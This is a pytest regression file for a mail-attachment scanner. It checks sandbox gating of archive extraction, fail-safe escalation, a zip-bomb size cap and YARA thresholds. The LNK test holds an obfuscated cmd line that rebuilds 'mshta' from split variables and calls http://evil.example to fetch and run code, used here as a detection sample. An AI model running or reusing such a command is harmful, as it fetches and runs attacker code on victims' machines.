"""SEC-H1 regression for the "archive" tool (added 2026-08-02): ZIP/7z/ISO
member extraction and LNK command parsing previously ran unconditionally in
the main pipeline process with no sandbox at all. Mirrors
test_extraction_sandbox_failsafe.py's convention for the pre-existing
required tools (oletools/pdfid/pymupdf/markitdown).
"""
import io
import sys
import zipfile
from pathlib import Path

sys.path.insert(0, str(Path(__file__).parent.parent / "src"))

import extraction


def _no_sandbox(monkeypatch):
    monkeypatch.setattr(extraction, "_can_sandbox", lambda tool: False)
    monkeypatch.setattr(extraction, "_allow_unsandboxed", lambda: False)


def _allow_local(monkeypatch):
    monkeypatch.setattr(extraction, "_can_sandbox", lambda tool: False)
    monkeypatch.setattr(extraction, "_allow_unsandboxed", lambda: True)


def test_archive_escalates_instead_of_local_scan(monkeypatch):
    _no_sandbox(monkeypatch)
    monkeypatch.setattr(extraction, "_local_archive_scan",
                        lambda *a, **k: (_ for _ in ()).throw(AssertionError("local archive scan ran unsandboxed!")))
    res = extraction._run_tool("archive", b"PK\x03\x04fakezip", "/tmp/x.zip", "x.zip")
    assert res["escalate"] is True
    assert res["suspicious"] is True
    assert res["sandbox_required_unavailable"] is True
    assert res.get("sandboxed") is False


def test_archive_is_gated_end_to_end(monkeypatch, tmp_path):
    _no_sandbox(monkeypatch)
    monkeypatch.setattr(extraction, "_local_archive_scan",
                        lambda *a, **k: (_ for _ in ()).throw(AssertionError("local archive scan ran!")))
    inner_buf = io.BytesIO()
    with zipfile.ZipFile(inner_buf, "w") as zf:
        zf.writestr("payload.txt", "just text")
    f = tmp_path / "archive.zip"
    f.write_bytes(inner_buf.getvalue())
    att = {"stored_path": str(f), "original_name": "archive.zip",
           "declared_type": "application/zip", "real_type": "application/zip", "sha256": "a" * 64}
    res = extraction.extract_attachment(att)
    assert res["escalate"] is True
    assert any("sandbox_unavailable_for_archive" in fl for fl in res["flags"])


def test_escape_hatch_allows_local_archive_scan_when_explicitly_enabled(monkeypatch):
    _allow_local(monkeypatch)
    ran = {"archive": False}

    def _fake_scan(content, filename, effective_mime=""):
        ran["archive"] = True
        return {"tool": "archive", "status": "ok", "inspected": True,
                "suspicious": False, "escalate": False, "flags": []}

    monkeypatch.setattr(extraction, "_local_archive_scan", _fake_scan)
    res = extraction._run_tool("archive", b"data", "/tmp/x.zip", "x.zip")
    assert ran["archive"] is True
    assert not res.get("sandbox_required_unavailable")


def test_rar_vhd_vhdx_cab_always_escalate_no_parser(monkeypatch):
    # These formats have no vetted extraction library at all -- they must
    # escalate regardless of sandbox availability (matches the OneNote
    # precedent), not depend on Docker being up or down.
    for ext in (".rar", ".vhd", ".vhdx", ".cab"):
        result = extraction._local_archive_scan(b"arbitrary bytes", f"attachment{ext}")
        assert result["escalate"] is True, f"{ext} should always escalate"
        assert result["suspicious"] is True
        assert any("no_parser_available_for_format" in fl for fl in result["flags"])
        assert result["inspected"] is False


def test_standalone_lnk_routes_through_archive_tool_end_to_end(monkeypatch, tmp_path):
    _allow_local(monkeypatch)
    # A LNK whose extracted command line matches an existing YARA rule
    # (lnk_split_lolbin_reconstruction) must escalate the whole attachment.
    monkeypatch.setattr(extraction, "_extract_lnk_command",
                        lambda content: '/v:on /C "set kZ=msh&&set KBh=ta&&start "" !kZ!!KBh! http://evil.example"')
    f = tmp_path / "invoice.lnk"
    f.write_bytes(b"L\x00\x00\x00fake lnk bytes")
    att = {"stored_path": str(f), "original_name": "invoice.lnk",
           "declared_type": "application/x-ms-shortcut", "real_type": "application/x-ms-shortcut",
           "sha256": "b" * 64}
    res = extraction.extract_attachment(att)
    assert res["escalate"] is True
    assert any("lnk_command_yara_match" in fl for fl in res["flags"])


def test_sandbox_required_tool_hard_crash_escalates(monkeypatch, tmp_path):
    # A container that OOM-kills/segfaults for a SANDBOX_REQUIRED_TOOLS tool
    # returns a raw {"status": "error", ...} with neither
    # sandbox_required_unavailable nor a timeout_killed_after_ prefix -- the
    # generic 7d fail-safe must still catch this (closes a gap that existed
    # for oletools/pdfid/pymupdf/markitdown too, not just archive).
    inner_buf = io.BytesIO()
    with zipfile.ZipFile(inner_buf, "w") as zf:
        zf.writestr("readme.txt", "clean text")
    f = tmp_path / "clean.zip"
    f.write_bytes(inner_buf.getvalue())

    real_run_tool = extraction._run_tool

    def _fake_run_tool(tool_name, content, stored_path, filename="file.bin", effective_mime=""):
        if tool_name == "archive":
            return {"tool": "archive", "status": "error",
                    "error": "container_exit_137: Killed"}
        return real_run_tool(tool_name, content, stored_path, filename, effective_mime)

    monkeypatch.setattr(extraction, "_run_tool", _fake_run_tool)
    att = {"stored_path": str(f), "original_name": "clean.zip",
           "declared_type": "application/zip", "real_type": "application/zip", "sha256": "c" * 64}
    res = extraction.extract_attachment(att)
    assert res["escalate"] is True
    assert any("sandbox_error_for_archive" in fl for fl in res["flags"])


def test_zip_bomb_nesting_check_never_reads_oversized_members(monkeypatch):
    # Regression for the unbounded zf.read() in the nesting-depth check
    # (fixed 2026-08-02, previously had no size cap unlike the member-YARA
    # loop below it): a member declaring >10MB must never be decompressed
    # at all during the nesting check, even before the bomb-ratio math runs.
    inner_buf = io.BytesIO()
    with zipfile.ZipFile(inner_buf, "w", zipfile.ZIP_DEFLATED) as zf:
        zf.writestr("small.txt", "clean text")
        zf.writestr("huge.bin", b"A" * 11_000_000)  # compresses to ~KB, declares 11MB
    data = inner_buf.getvalue()

    real_read = zipfile.ZipFile.read

    def _guarded_read(self, name, *a, **k):
        info = self.getinfo(name) if isinstance(name, str) else name
        assert info.file_size <= 10 * 1024 * 1024, (
            f"zf.read() called on oversized member {name!r} "
            f"(declared {info.file_size} bytes) -- the 10MB cap was bypassed"
        )
        return real_read(self, name, *a, **k)

    monkeypatch.setattr(zipfile.ZipFile, "read", _guarded_read)

    result = extraction._local_archive_scan(data, "test.zip")
    assert result["inspected"] is True
    assert result["status"] == "ok"


def _fake_yara(rule_names):
    return {"tool": "yara", "status": "ok", "suspicious": bool(rule_names),
            "matches": [{"rule": r} for r in rule_names]}


def test_yara_three_plus_distinct_rules_skips_sandboxed_tools(monkeypatch, tmp_path):
    # 3+ distinct YARA rule matches on the attachment's own bytes is already
    # overwhelming static evidence (escalate is forced by the YARA match
    # itself regardless of count) -- the sandboxed extraction tools add cost
    # and sandbox exposure for zero decision-relevant benefit at that point.
    _no_sandbox(monkeypatch)
    monkeypatch.setattr(extraction, "_local_yara",
                         lambda content: _fake_yara(["rule_a", "rule_b", "rule_c"]))
    f = tmp_path / "invoice.docx"
    f.write_bytes(b"fake docx bytes")
    att = {"stored_path": str(f), "original_name": "invoice.docx",
           "declared_type": "application/vnd.openxmlformats-officedocument.wordprocessingml.document",
           "real_type": "application/vnd.openxmlformats-officedocument.wordprocessingml.document",
           "sha256": "e" * 64}
    res = extraction.extract_attachment(att)
    assert res["escalate"] is True
    assert not any(t.get("tool") in extraction.SANDBOX_REQUIRED_TOOLS for t in res["tools_run"])
    assert any("yara_high_confidence_skip_sandbox" in fl for fl in res["flags"])


def test_yara_two_distinct_rules_still_runs_sandboxed_tools(monkeypatch, tmp_path):
    # Below the 3-rule threshold: still escalates (any YARA match already
    # forces that), but sandboxed extraction must still run as normal --
    # no regression from the skip-sandbox logic above.
    _no_sandbox(monkeypatch)
    monkeypatch.setattr(extraction, "_local_yara",
                         lambda content: _fake_yara(["rule_a", "rule_b"]))
    f = tmp_path / "invoice.docx"
    f.write_bytes(b"fake docx bytes")
    att = {"stored_path": str(f), "original_name": "invoice.docx",
           "declared_type": "application/vnd.openxmlformats-officedocument.wordprocessingml.document",
           "real_type": "application/vnd.openxmlformats-officedocument.wordprocessingml.document",
           "sha256": "f" * 64}
    res = extraction.extract_attachment(att)
    assert res["escalate"] is True
    assert any(t.get("tool") in extraction.SANDBOX_REQUIRED_TOOLS for t in res["tools_run"])
    assert not any("yara_high_confidence_skip_sandbox" in fl for fl in res["flags"])


def test_yara_rule_count_deduplicates_repeated_rule_names(monkeypatch, tmp_path):
    # _local_yara aggregates matches across multiple compiled rulesets, so
    # the same rule name can appear more than once in "matches" -- the skip
    # threshold must count DISTINCT rule names, not raw match entries, or
    # a file matching one rule twice would be miscounted toward 3+.
    _no_sandbox(monkeypatch)
    monkeypatch.setattr(extraction, "_local_yara",
                         lambda content: _fake_yara(["rule_a", "rule_a", "rule_b"]))
    f = tmp_path / "invoice.docx"
    f.write_bytes(b"fake docx bytes")
    att = {"stored_path": str(f), "original_name": "invoice.docx",
           "declared_type": "application/vnd.openxmlformats-officedocument.wordprocessingml.document",
           "real_type": "application/vnd.openxmlformats-officedocument.wordprocessingml.document",
           "sha256": "1" * 64}
    res = extraction.extract_attachment(att)
    assert any(t.get("tool") in extraction.SANDBOX_REQUIRED_TOOLS for t in res["tools_run"])
    assert not any("yara_high_confidence_skip_sandbox" in fl for fl in res["flags"])
